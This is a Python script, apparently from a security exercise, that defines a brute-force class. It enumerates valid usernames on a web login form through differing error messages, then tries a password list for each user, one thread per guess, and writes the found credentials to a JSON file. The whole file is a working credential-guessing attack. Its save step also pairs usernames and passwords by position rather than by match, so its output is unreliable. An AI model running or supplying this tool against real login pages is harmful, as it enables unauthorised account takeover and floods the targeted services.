import json
import requests
import threading

#
class BruteForcer:
    def __init__(self, url, users_file, passwords_file):
        with open(users_file) as uf, open(passwords_file) as pf:
            self.users = uf.readlines()
            self.passwords = pf.readlines()
        self.session = requests.Session()
        self.url = url
        self.valid_usernames = []
        self.valid_passwords = []
        

    def check_username(self, _, username):
        username = username.strip()

        payload = {
            "username": username,
            "password": "LoQueEsYnOeSNoDebeSer146565198",
        }
        response = self.session.post(self.url, data=payload)
        if "Invalid username" not in response.text:
            # Agregamos el nombre de usuario a la lista
            self.valid_usernames.append(username)
            return True
        print(f"user: {username} incorrect")
        return False


    def bruteforce(self, username, password):
        password = password.strip()

        payload = {
            "username": username,
            "password": password,
        }
        response = self.session.post(self.url, data=payload)
        if "Incorrect password" not in response.text:
            # Agregamos la contraseña a la lista
            self.valid_passwords.append(password)
            return True
        print(f"pass: {password} incorrect")
        return False


    def run_threads(self, function, targets, username):
        threads = []
        for target in targets:
            thread = threading.Thread(target=function, args=(username, target,))
            threads.append(thread)
            thread.start()
        return threads


    def find_valid_usernames(self):
        threads = self.run_threads(self.check_username, self.users, None)
        for thread in threads:
            thread.join()


    def find_valid_passwords(self):
        for username in self.valid_usernames:
            threads = self.run_threads(self.bruteforce, self.passwords, username)
            for thread in threads:
                thread.join()

    def save_credentials(self, filename):
        credentials = dict(zip(self.valid_usernames, self.valid_passwords))
        with open(filename, 'w') as f:
            json.dump(credentials, f)
